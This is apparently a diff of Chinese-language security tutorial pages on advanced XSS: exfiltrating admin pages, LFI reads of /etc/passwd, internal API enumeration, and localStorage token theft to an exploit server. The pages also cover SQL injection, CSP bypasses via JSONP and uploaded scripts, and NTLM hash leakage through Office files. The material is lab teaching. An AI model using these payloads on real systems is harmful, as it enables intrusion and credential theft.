 <p>我们将再次使用与利用服务器上自定义漏洞利用的基础 XSS 负载相同的内容：</p>
 <pre><code>&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
 <p>从受害者的用户上下文中窃取 <code>/home.php</code> 端点会暴露出端点/<code>admin.php</code>，而我们的用户无法访问：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418153117.png" alt="Pasted image 20260418153117" />
+<img alt="Pasted image 20260418153117" src="assets/posts/advanced-xss-csrf/Pasted image 20260418153117.png"/>
 <p>为了识别管理员端点显示的数据，我们可以使用上一节中使用的相同负载来导出响应：</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 xhr.open('GET', '/admin.php', true);
@@ -2493,7 +2493,7 @@ xhr.onload = () =&gt; {
 };
 xhr.send();</code></pre>
 <p>这揭示了以下 HTML 回复：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418153143.png" alt="Pasted image 20260418153143" />
+<img alt="Pasted image 20260418153143" src="assets/posts/advanced-xss-csrf/Pasted image 20260418153143.png"/>
 <p>分析 HTML 源代码后，管理员端点似乎支持 GET 参数<code>视图</code> ，可以设置到当前工作目录中的不同文件。这是本地文件包含（LFI）漏洞的明显切入点。为了验证我们的假设，让我们调整载荷以包含文件 <code>/etc/passwd</code>：</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 xhr.open('GET', '/admin.php?view=../../../../etc/passwd', true);
@@ -2506,7 +2506,7 @@ xhr.onload = () =&gt; {
 };
 xhr.send();</code></pre>
 <p>等待受害者再次触发 XSS 漏洞后，我们收到以下对撤离服务器的回复，其中包含我们泄露的文件：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418153219.png" alt="Pasted image 20260418153219" />
+<img alt="Pasted image 20260418153219" src="assets/posts/advanced-xss-csrf/Pasted image 20260418153219.png"/>
 <blockquote><strong>注：</strong> 我们可以将 HTML 代码保存到本地文件中，并在网页浏览器中打开以显示页面。我们可能需要泄露更多文件，比如脚本文件或样式表，以正确渲染页面。</blockquote>
 <h2>枚举内部 API</h2>
 <p>正如我们所见，我们可以利用 XSS 漏洞在受害者的用户上下文中触发特定功能，并窃取受害者有权访问的数据。然而，由于 XSS 有效载荷是在受害者的浏览器中执行的，因此它也使我们能够攻击仅在受害者私有网络内可访问的其他 Web 应用程序。</p>
@@ -2524,9 +2524,9 @@ xhr.onload = () =&gt; {
 };
 xhr.send();</code></pre>
 <p>由此可得出以下结论：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418154643.png" alt="Pasted image 20260418154643" />
+<img alt="Pasted image 20260418154643" src="assets/posts/advanced-xss-csrf/Pasted image 20260418154643.png"/>
 <p>正如我们所见，管理端点会从 API 加载额外信息<code>https://api.internal-apis.htb/</code>。但是，如果我们尝试访问该 API，则会被阻止，这表明该 API 只能从受害者的本地网络访问：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418154701.png" alt="Pasted image 20260418154701" />
+<img alt="Pasted image 20260418154701" src="assets/posts/advanced-xss-csrf/Pasted image 20260418154701.png"/>
 <p>因此，我们必须调整 XSS 有效载荷，以便枚举受害者浏览器中的 API。</p>
 <p><strong>枚举内部API</strong> 首先，我们来提取管理员端点中泄露的端点<code>/v1/sessions</code>。我们可以通过相应地调整 XSS 有效载荷来实现这一点：</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
@@ -2567,7 +2567,7 @@ exfil.setRequestHeader("Content-Type", "application/json");
 exfil.send(JSON.stringify({data: btoa(msg)}));</code></pre>
 <p>这将导致以下信息被泄露，表明我们的 HTTP 请求出现了问题，从而使我们能够调整请求的配置以匹配 CORS 配置：</p>
 <pre><code class="language-txt">NetworkError: Failed to execute 'send' on 'XMLHttpRequest': Failed to load 'https://api.internal-apis.htb/v1/sessions'.</code></pre>
-<p>此外，内部 API 可能需要使用身份验证持有者而非 Cookie 进行身份验证。我们可以使用<a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage" target="_blank" rel="noreferrer">localStorage</a>属性访问存储在受害者本地存储中的身份验证持有者（在存在漏洞的 Web 应用程序上下文中）。然后，我们可以使用<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader" target="_blank" rel="noreferrer">setRequestHeader</a><code>Authorization</code>函数设置请求头。<code>XMLHttpRequest</code></p>
+<p>此外，内部 API 可能需要使用身份验证持有者而非 Cookie 进行身份验证。我们可以使用<a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage" rel="noreferrer" target="_blank">localStorage</a>属性访问存储在受害者本地存储中的身份验证持有者（在存在漏洞的 Web 应用程序上下文中）。然后，我们可以使用<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader" rel="noreferrer" target="_blank">setRequestHeader</a><code>Authorization</code>函数设置请求头。<code>XMLHttpRequest</code></p>
 <blockquote><strong>注意：</strong> 如果您没有收到预期的数据，请记住可能是 CORS 配置存在问题或缺少身份验证。</blockquote>
 <p>经过适当修改以避免 CORS 错误后，我们收到了来自外泄服务器的数据，然后我们可以对其进行解码：</p>
 <pre><code class="language-shell">Chenduoduo@htb[/htb]$ echo -n eyJzZXNzaW9ucyI6W3siYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA5LjAuNTQxNC4xMjAgU2FmYXJpLzUzNy4zNiIsInRpbWUiOiIxNjkxNjQ1NzMxIiwidXNlciI6ImFkbWluIn0seyJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDkuMC41NDE0LjEyMCBTYWZhcmkvNTM3LjM2IiwidGltZSI6IjE2OTI1OTYxMzEiLCJ1c2VyIjoiYWRtaW4ifSx7ImFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjU0MTQuMTIwIFNhZmFyaS81MzcuMzYiLCJ0aW1lIjoiMTY5MzIwMDkzMSIsInVzZXIiOiJhZG1pbiJ9XX0K | base64 -d | jq
@@ -2591,7 +2591,7 @@ exfil.send(JSON.stringify({data: btoa(msg)}));</code></pre>
     }
   ]
 }</code></pre>
-<p>由于数据中不包含任何有价值的信息，我们进一步枚举 API 以识别其他端点。我们可以通过在 XSS 有效载荷中实现目录暴力破解来识别其他端点，该破解会将所有现有端点泄露到泄露服务器。我们将基于<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/objects-lowercase.txt" target="_blank" rel="noreferrer">objects-lowercase.txt</a>字典进行概念验证<code>SecLists</code>。有效载荷将向每个端点发送请求，然后通过检查状态码来确定端点是否有效。我们可以使用类似于以下的有效载荷来实现这一点：</p>
+<p>由于数据中不包含任何有价值的信息，我们进一步枚举 API 以识别其他端点。我们可以通过在 XSS 有效载荷中实现目录暴力破解来识别其他端点，该破解会将所有现有端点泄露到泄露服务器。我们将基于<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/objects-lowercase.txt" rel="noreferrer" target="_blank">objects-lowercase.txt</a>字典进行概念验证<code>SecLists</code>。有效载荷将向每个端点发送请求，然后通过检查状态码来确定端点是否有效。我们可以使用类似于以下的有效载荷来实现这一点：</p>
 <pre><code class="language-js">var endpoints = ['access-token','account','accounts','amount','balance','balances','bar','baz','bio','bios','category','channel','chart','circular','company','content','contract','coordinate','credentials','creds','custom','customer','customers','details','dir','directory','dob','email','employee','event','favorite','feed','foo','form','github','gmail','group','history','image','info','item','job','link','links','location','log','login','logins','logs','map','member','members','messages','money','my','name','names','news','option','options','pass','password','passwords','phone','picture','pin','post','prod','production','profile','profiles','publication','record','sale','sales','set','setting','settings','setup','site','test','theme','token','tokens','twitter','union','url','user','username','users','vendor','vendors','version','website','work','yahoo'];
 
 for (i in endpoints){
@@ -2629,9 +2629,9 @@ xhr.send();</code></pre>
 <h2>利用内部 Web 应用程序（一）</h2>
 <p><strong>识别漏洞</strong></p>
 <p>我们将从前几节中使用的相同的 XSS 攻击载荷和<code>/admin.php</code>端点数据外泄开始。这里我们将省略这部分内容，因为我们已经在前几节中讨论过相应的攻击载荷。 当受害者触发 XSS 漏洞时，响应会被泄露到泄露服务器。我们可以看到，管理端点包含对内部 Web 应用程序的引用<code>https://internal.internal-webapps-1.htb</code>：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418161718.png" alt="Pasted image 20260418161718" />
+<img alt="Pasted image 20260418161718" src="assets/posts/advanced-xss-csrf/Pasted image 20260418161718.png"/>
 <p>如果我们尝试直接访问该页面，则会被阻止：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418161726.png" alt="Pasted image 20260418161726" />
+<img alt="Pasted image 20260418161726" src="assets/posts/advanced-xss-csrf/Pasted image 20260418161726.png"/>
 <p>因此，让我们利用 XSS 漏洞枚举 Web 应用程序，就像我们在上一节中对内部 API 所做的那样。我们将首先提取 Web 应用程序的索引：</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://internal.internal-webapps-1.htb/', false);
@@ -2643,7 +2643,7 @@ xhr.onload = () =&gt; {
 };
 xhr.send();</code></pre>
 <p>结果显示，内部 Web 应用程序受到身份验证保护，因为索引包含一个登录表单：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418161829.png" alt="Pasted image 20260418161829" />
+<img alt="Pasted image 20260418161829" src="assets/posts/advanced-xss-csrf/Pasted image 20260418161829.png"/>
 <p>XSS漏洞允许我们与内部Web应用程序进行完全交互。我们可以尝试使用默认密码或暴力破解其他端点。但是，本节将重点介绍SQL注入漏洞。我们可以从登录表单构造一个有效的登录POST请求，该请求会被内部Web应用程序接受。让我们尝试一个简单的SQL注入，发送一个包含单引号的用户名：</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 var params = \`uname=\${encodeURIComponent("'test")}&amp;pass=x\`;
@@ -2752,7 +2752,7 @@ xhr.onload = () =&gt; {
 };
 xhr.send();</code></pre>
 <p>这将显示以下 HTML 内容，表明我们可以使用该 Web 应用程序来检查不同 Web 应用程序的状态：</p>
-<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418165934.png" alt="Pasted image 20260418165934" />
+<img alt="Pasted image 20260418165934" src="assets/posts/advanced-xss-csrf/Pasted image 20260418165934.png"/>
 <p>我们可以通过分析表单来确定 Web 应用程序究竟是如何实现此功能的，从而构建相应的 POST 请求：</p>
 <pre><code class="language-js">var xhr = new XMLHttpRequest();
 var params = \`webapp_selector=\${encodeURIComponent("https://internal-webapps-2.htb")}\`;
@@ -2825,13 +2825,13 @@ xhr.send(params);</code></pre>
 <h3>CSP 基础知识</h3>
 <p>由多个指令组成。每个指令允许一个或多个值。浏览器会强制执行 CSP，并根据 CSP 阻止资源的加载或执行。本节将讨论一些示例指令。</p>
 <p>例如，该 <code>script-src</code> 指令定义了 JavaScript 可以从哪些位置加载和执行；我们可以使用以下策略限制允许加载 JavaScript 代码的域：</p>
-<p>http <code>Content-Security-Policy: script-src 'self' https://benignsite.htb</code></p>
+<pre><code>Content-Security-Policy: script-src 'self' https://benignsite.htb</code></pre>
 <p>此内容安全策略 (CSP) 指示浏览器仅从与页面自身同源的源以及外部源加载 JavaScript <code>https://benignsite.htb</code>。因此，如果攻击者在 XSS 有效载荷中注入以下 JavaScript 代码，受害者的浏览器将不会加载该脚本，因此也不会执行它：</p>
-<p>html <code>&lt;script src="https://exploitserver.htb/pwn.js"&gt;&lt;/script&gt;</code></p>
+<pre><code>&lt;script src="https://exploitserver.htb/pwn.js"&gt;&lt;/script&gt;</code></pre>
 <p>但是，允许加载和执行以下脚本：</p>
-<p>html <code>&lt;script src="/js/useful.js"&gt;&lt;/script&gt; &lt;script src="https://benignsite.htb/main.js"&gt;&lt;/script&gt;</code></p>
+<pre><code>&lt;script src="/js/useful.js"&gt;&lt;/script&gt; &lt;script src="https://benignsite.htb/main.js"&gt;&lt;/script&gt;</code></pre>
 <p>此外，由于<code>unsafe-inline</code>未指定该值，它会阻止所有内联脚本。因此，以下潜在的 XSS 有效载荷均被阻止，从而不会执行：</p>
-<p>html <code>&lt;script&gt;alert(1)&lt;/script&gt; &lt;img src=x onerror=alert(1) /&gt; &lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</code></p>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt; &lt;img src=x onerror=alert(1) /&gt; &lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</code></pre>
 <p>此外，还有其他一些常见指令：</p>
 <ul><li><code>style-src</code>样式表的允许来源</li><li><code>img-src</code>允许的图片来源</li><li><code>object-src</code>允许的来源，例如对象<code>&lt;object&gt;</code>或<code>&lt;embed&gt;</code></li><li><code>connect-src</code>允许脚本发出 HTTP 请求的来源。例如，使用<code>XMLHttpRequest</code></li><li><code>default-src</code>：如果未显式设置其他指令，则使用此回退值。例如，如果<code>img-src</code>CSP 中不存在此指令，浏览器将使用此值来处理图像。</li><li><code>frame-ancestors</code>允许来源对页面进行框架嵌入，例如，在 <code>&lt;div&gt; </code>标签内\`<code>&lt;iframe&gt;</code><code>。此指令可用于防止</code><code>Clickjacking</code>\`攻击。</li><li>\`<code>form-action</code>\`表单提交允许的来源</li></ul>
 <p>指令的其他值包括：</p>
@@ -2843,50 +2843,50 @@ xhr.send(params);</code></pre>
 - \`sha256-407e1bf4a1472948aa7b15cafa752fcf8e90710833da8a59dd8ef8e7fe56f22d\`允许通过哈希值添加元素
 - \`nonce-S0meR4nd0mN0nC3\`允许通过 nonce 添加元素</code></pre>
 <p>有关其他 CSP 指令值，请查看此处提供的列表。</p>
-<hr />
+<hr/>
 <h3>安全 CSP</h3>
 <p>尽可能严格地执行内容安全策略 (CSP) 对确保 Web 应用程序的安全至关重要。一个好的方法是从一个严格的基准 CSP 开始，逐步放宽限制，直到 Web 应用程序按预期运行。一个好的基准 CSP 如下：</p>
-<p>http <code>Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';</code></p>
+<pre><code>Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';</code></pre>
 <p>此内容安全策略 (CSP) 仅允许从同一源加载图像、样式表和脚本。它还仅允许 JavaScript 向同一源发送 HTTP 请求和表单提交，仅允许同一源的资源嵌入网页，并阻止加载任何其他资源。如果使用任何外部资源，则必须相应地调整此 CSP。</p>
 <p>此外，必须移除 Web 应用程序使用的内联 JavaScript 代码，以防止其被阻止。这可以通过将其移动到脚本文件并加载来轻松实现。例如，考虑以下内联 JavaScript 代码：</p>
-<p>html <code>&lt;script&gt; var poc = "test"; function submitForm(){     console.log(poc); } &lt;/script&gt; &lt;button id="submit" onclick="submitForm()"&gt;</code></p>
+<pre><code>&lt;script&gt; var poc = "test"; function submitForm(){     console.log(poc); } &lt;/script&gt; &lt;button id="submit" onclick="submitForm()"&gt;</code></pre>
 <p><code>test.js</code>提供的代码在功能上与创建包含以下内容的文件完全相同：</p>
-<p>js <code>var poc = "test"; function submitForm(){     console.log(poc); } document.getElementById("submit").addEventListener('click', submitForm);</code></p>
+<pre><code>var poc = "test"; function submitForm(){     console.log(poc); } document.getElementById("submit").addEventListener('click', submitForm);</code></pre>
 <p>然后加载脚本：</p>
-<p>html <code>&lt;script src="/test.js"&gt;&lt;/script&gt;</code></p>
+<pre><code>&lt;script src="/test.js"&gt;&lt;/script&gt;</code></pre>
 <p>这样就可以移除所有内联 JavaScript 代码。</p>
 <p>我们可以使用现有的在线工具来评估云安全策略 (CSP)，例如Google 提供的CSP 评估工具。有关如何编写安全 CSP 的更多详细信息，请参阅OWASP CSP 速查表。</p>
 <h2>绕过弱 CSP</h2>
-<hr />
+<hr/>
 <p>现在我们已经讨论了 CSP、CSP 指令和 CSP 指令值，接下来让我们讨论如何利用和绕过弱 CSP。</p>
-<hr />
+<hr/>
 <h3>绕过弱 CSP</h3>
 <p>网络安全策略 (CSP) 可以作为一种纵深防御措施，用于防止跨站脚本攻击 (XSS)。然而，即使 Web 应用程序实现了 CSP，也并不意味着它就能自动抵御所有 XSS 攻击。如果 CSP 存在漏洞，攻击者就有可能绕过它。因此，分析 Web 应用程序的 CSP 是否存在潜在的绕过漏洞至关重要。</p>
 <p>让我们先来看下面的CSP：</p>
-<p>http <code>Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; font-src *; script-src 'self' https://*.google.com;</code></p>
+<pre><code>Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; font-src *; script-src 'self' https://*.google.com;</code></pre>
 <p>此 CSP 允许从源本身加载图像，从任何位置加载样式和字体，从源本身及其任何子域加载脚本<code>google.com</code>。由于该指令，所有其他资源都无法加载<code>default-src 'none'</code>。</p>
 <p>假设我们尝试在 Web 应用程序中注入一个简单的警告弹出窗口作为概念验证：</p>
-<p>html <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
 <p>由于 CSP 的限制，不会显示警告弹出窗口；取而代之的是，浏览器的 JavaScript 控制台将打印以下错误消息：</p>
-<p>html <code>Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' https://*.google.com". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution.</code></p>
-<p>虽然这种防御技术乍看之下似乎很安全，但它可以通过 <a href="https://www.w3schools.com/js/js_json_jsonp.asp" target="_blank" rel="noreferrer">JSONP</a>绕过。JSONP 是一种可以跨不同来源检索数据而不会受到同源策略限制的技术。JSONP 的基本思想是使用<code>script</code>标签来跨来源检索数据，因为标签不受同源策略的限制。例如，假设一个 Web 应用程序<code>https://vulnerablesite.htb</code>想要从端点 <code>&lt;endpoint&gt;</code> 检索数据<code>https://someapi.htb/stats</code>，该端点返回以下 JSON 数据：</p>
-<p>JSON <code>{'clicks': 1337}</code></p>
+<pre><code>Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' https://*.google.com". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution.</code></pre>
+<p>虽然这种防御技术乍看之下似乎很安全，但它可以通过 <a href="https://www.w3schools.com/js/js_json_jsonp.asp" rel="noreferrer" target="_blank">JSONP</a>绕过。JSONP 是一种可以跨不同来源检索数据而不会受到同源策略限制的技术。JSONP 的基本思想是使用<code>script</code>标签来跨来源检索数据，因为标签不受同源策略的限制。例如，假设一个 Web 应用程序<code>https://vulnerablesite.htb</code>想要从端点 <code>&lt;endpoint&gt;</code> 检索数据<code>https://someapi.htb/stats</code>，该端点返回以下 JSON 数据：</p>
+<pre><code>{'clicks': 1337}</code></pre>
 <p>如果 API 未配置 CORS，则由于同源策略的限制，Web 应用程序无法访问跨域请求的响应。但是，由于脚本标签不受同源策略的限制，Web 应用程序可以通过在其页面上使用以下 HTML 标签来加载数据：</p>
-<p>html <code>&lt;script src="https://someapi.htb/stats"&gt;&lt;/script&gt;</code></p>
+<pre><code>&lt;script src="https://someapi.htb/stats"&gt;&lt;/script&gt;</code></pre>
 <p>然而，这本身并不实用，因为 Web 应用程序需要以某种方式处理数据。假设 Web 应用程序实现了一个<code>processData</code>用于此目的的函数。但是，目前没有办法将接收到的数据传递给该函数。这时，JSONP 就派上了用场。如果 API 支持 JSONP，它会读取发送数据的端点上的 GET 参数，并相应地调整响应。该参数通常称为 <code>get_data</code> <code>callback</code>。假设我们调用端点 <code>get_data</code> <code>https://someapi.htb/stats?callback=processData</code>。这将导致 API 发送以下响应：</p>
-<p>js <code>processData({'clicks': 1337})</code></p>
+<pre><code>processData({'clicks': 1337})</code></pre>
 <p>现在，Web应用程序可以在其页面上插入以下脚本标签：</p>
-<p>html <code>&lt;script src="https://someapi.htb/stats?callback=processData"&gt;&lt;/script&gt;</code></p>
+<pre><code>&lt;script src="https://someapi.htb/stats?callback=processData"&gt;&lt;/script&gt;</code></pre>
 <p>这样一来，就可以对从 API 跨域获取的数据调用 Web 应用程序的<code>processData</code>功能，而不会违反同源策略或需要 CORS。</p>
-<p>由于 JSONP 端点允许调用者指定要调用的函数，因此它们可用于动态创建由提供 JSONP 端点的域发送的 JavaScript 代码。因此，JSONP 可用于绕过内容安全策略 (CSP)。Google 提供了多个不同的 JSONP 端点。JSONBee <a href="https://github.com/zigoo0/JSONBee" target="_blank" rel="noreferrer">GitHub</a>代码库列出了许多可用于绕过 CSP 的 JSONP 端点。我们可以使用以下 Google JSONP 端点来绕过上述 CSP：</p>
-<p>html <code>&lt;script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"&gt;&lt;/script&gt;</code></p>
+<p>由于 JSONP 端点允许调用者指定要调用的函数，因此它们可用于动态创建由提供 JSONP 端点的域发送的 JavaScript 代码。因此，JSONP 可用于绕过内容安全策略 (CSP)。Google 提供了多个不同的 JSONP 端点。JSONBee <a href="https://github.com/zigoo0/JSONBee" rel="noreferrer" target="_blank">GitHub</a>代码库列出了许多可用于绕过 CSP 的 JSONP 端点。我们可以使用以下 Google JSONP 端点来绕过上述 CSP：</p>
+<pre><code>&lt;script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"&gt;&lt;/script&gt;</code></pre>
 <p>将此条目发布到留言簿会触发警告弹出窗口，从而绕过内容安全策略 (CSP)：</p>
 <p>https://vulnerablesite.htb/view.php</p>
-<img src="https://cdn.services-k8s.prod.aws.htb.systems/content/modules/235/xss/xss_csp_1.png" alt="Referenced image" />
+<img alt="Referenced image" src="https://cdn.services-k8s.prod.aws.htb.systems/content/modules/235/xss/xss_csp_1.png"/>
 <p>另一个常见的缺陷是假设<code>'self'</code>值本身是安全的。例如，考虑以下 CSP：</p>
-<p>http <code>Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; script-src 'self';</code></p>
+<pre><code>Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; script-src 'self';</code></pre>
 <p>这次，脚本只能从源服务器本身加载。假设源服务器不提供 JSONP 端点，这看起来是安全的。但是，考虑这样一种情况：Web 应用程序允许用户上传文件。如果允许上传任意文件类型，攻击者就可以上传文件<code>.js</code>。然后，攻击者可以通过从源服务器本身加载上传的有效载荷来利用 XSS 漏洞：</p>
-<p>html <code>&lt;script src="/uploads/avatag.jpg.js"&gt;&lt;/script&gt;</code></p>
+<pre><code>&lt;script src="/uploads/avatag.jpg.js"&gt;&lt;/script&gt;</code></pre>
 <p>通常，对内容安全策略 (CSP) 的评估取决于具体的 CSP 本身以及 Web 应用程序的功能。正如我们所见，如果 Web 应用程序实现了文件上传功能，则将<code>script-src</code>指令设置为 true<code>'self'</code>可能不安全。因此，在具体 Web 应用程序的上下文中评估 CSP 至关重要。</p>
 <p>&lt;scriPt sRc="https://exploitserver.htb/exploit"&gt;&lt;/scripT&gt;</p>
 <h2>XSS 过滤器绕过</h2>
@@ -3034,41 +3034,41 @@ Function(atob("YWxlcnQoMSk="))()</code></pre>
 <p>一旦攻击者获取了泄露的 NTLM 哈希值，其影响可能是毁灭性的。破解哈希值以获取明文密码并非总是必要；NTLM 哈希值本身可以直接用于<strong>哈希传递攻击</strong>。这使得攻击者无需知道用户密码即可进行身份验证，利用哈希值进行<strong>远程 PsExec、WMI 或 RDP 访问</strong>，甚至泄露之前无法获取的其他凭据。如果 NTLM 哈希值属于特权用户，攻击者可以执行<strong>DCSync 攻击</strong>、请求新的 Kerberos 票证或在域内提升权限。</p>
 <h2>1. Microsoft Word：通过恶意 RTF 自动链接泄露 NTLM 身份验证信息</h2>
 <p><strong>想象一下，你收到一个名为invoice.rtf</strong>的 Word 文档。乍一看，该文档以受<strong>保护视图</strong>打开，并启用了“只读”模式，以防止潜在的恶意内容。</p>
-<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063448.png" alt="Pasted image 20260411063448" />
+<img alt="Pasted image 20260411063448" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063448.png"/>
 <p>然而，大多数用户可能会启用编辑功能，尤其是在文档看起来合法且无法通过其他方式修改的情况下。点击“Enable Editing”后，会弹出一个警告窗口，提示文档可能包含<strong>恶意链接</strong>，您可以选择拒绝这些更新。</p>
-<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063513.png" alt="Pasted image 20260411063513" />
+<img alt="Pasted image 20260411063513" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063513.png"/>
 <p>您是否认为拒绝此提示中的链接会阻止所有外部连接？如果是这样，那就错了。由于<strong>Microsoft Word 处理自动 OLE（对象链接和嵌入）链接的方式存在逻辑缺陷</strong>，它会绕过“ _QueryHotLinks_ ”函数，忽略用户的响应。这会导致即使用户拒绝，也会通过调用链接上的std::filesystem::exists函数<strong>来自动访问远程文件。</strong></p>
 <p>如前所述，此次访问尝试会导致系统回退到通过 SMB 进行的 NTLM 身份验证。反过来，您的 NT 哈希值（NTLM 哈希值）将被发送到远程服务器，从而导致<strong>NTLM 凭据泄露</strong>。</p>
 <p><strong>该攻击通过在RTF文件中嵌入LINK属性</strong>自动发起，利用特定的“a”和“p”属性来控制OLE链接对象。除了启用编辑功能外，无需用户进行任何其他交互，这使得该漏洞尤其危险。</p>
 <h2>2. Microsoft Outlook：通过远程图片标签泄露 NTLM 身份验证</h2>
 <p><strong>想象一下，你收到一封来自不可信发件人的</strong>电子邮件，邮件正文的 HTML 代码中包含一张图片。攻击者使用了一种简单的技巧，通过类似这样的 HTML 标签插入图片：</p>
-<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063704.png" alt="Pasted image 20260411063704" />
-<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063712.png" alt="Pasted image 20260411063712" />
+<img alt="Pasted image 20260411063704" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063704.png"/>
+<img alt="Pasted image 20260411063712" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063712.png"/>
 <p>乍一看，这似乎并非一次复杂的攻击，大多数用户可能会忽略这张图片或避免保存它。然而，如果您尝试<strong>保存这张图片</strong>，您的 NTLM 凭据将立即泄露，因为该图片托管在远程恶意服务器上。Outlook 的安全机制旨在阻止对不受信任的电子邮件自动渲染图片，从而在这种情况下提供一定的保护。</p>
 <p>*<strong>真正的危险：可信发件人</strong>*</p>
 <p>当邮件来自<strong>可信发件人</strong>（例如同事或已被盗用的公司联系人）时，情况会变得更加危险。在这种情况下，图片会在打开邮件时自动渲染，无需任何用户交互。Outlook 尝试获取图片时，会向攻击者的 SMB 服务器发送<strong>NTLM 身份验证请求，从而泄露您的 NTLM 哈希值（NT 哈希）。</strong></p>
-<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063755.png" alt="Pasted image 20260411063755" />
+<img alt="Pasted image 20260411063755" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063755.png"/>
 <p><strong>为什么会发生这种情况</strong></p>
 <p>此漏洞的出现是因为 Outlook 会根据<strong>发件人的信任级别</strong>应用不同的安全规则。当电子邮件来自受信任的来源时，Outlook 不会阻止图像的自动渲染。带有指向远程 SMB 服务器的 src 属性的 HTML &lt;img&gt; 标签会在邮件打开时立即触发 NTLM 身份验证请求。这会导致用户的 NTLM 凭据立即泄露，而无需用户进行任何显式操作。</p>
-<p>在某些情况下，该问题甚至被发现可通过恶意图像复合匿名渲染实现<strong>远程代码执行 (</strong> <a href="https://www.youtube.com/watch?v=EQh6apPSRP0" target="_blank" rel="noreferrer"><strong>RCE</strong></a> <strong>)</strong>，尽管该特定漏洞已被修复。然而，自动 NTLM 泄露这一根本问题依然存在，尤其是在处理被入侵的受信任帐户时。</p>
+<p>在某些情况下，该问题甚至被发现可通过恶意图像复合匿名渲染实现<strong>远程代码执行 (</strong> <a href="https://www.youtube.com/watch?v=EQh6apPSRP0" rel="noreferrer" target="_blank"><strong>RCE</strong></a> <strong>)</strong>，尽管该特定漏洞已被修复。然而，自动 NTLM 泄露这一根本问题依然存在，尤其是在处理被入侵的受信任帐户时。</p>
 <h2>3. Microsoft Access：通过远程表刷新泄露 NTLM 身份验证</h2>
 <p><strong>想象一下，你收到一份名为report.accdb</strong>的 Microsoft Access 数据库文件形式的报告。你自然会打开该文件查看其内容。然而，首先映入眼帘的是一条警告信息：<strong>“此文件中的活动内容已被阻止”</strong> 许多用户可能会忽略这条信息，认为这是一种保护措施，并会因为潜在的危险内容已被禁用而感到安心。</p>
-<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064108.png" alt="Pasted image 20260411064108" />
+<img alt="Pasted image 20260411064108" src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064108.png"/>
 <p>忽略警告后，您将可以访问报告，报告中会显示一个醒目的黄色横幅，提示<strong>活动内容已被禁用</strong>。此横幅旨在让您产生一种安全感，暗示只要您不点击<strong>启用内容</strong> ，就可以安全地与文件交互。 然而，这是一种虚假的安全感——在您看到此横幅之前，您的 NTLM 哈希值就已经泄露了。</p>
-<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064154.png" alt="Pasted image 20260411064154" />
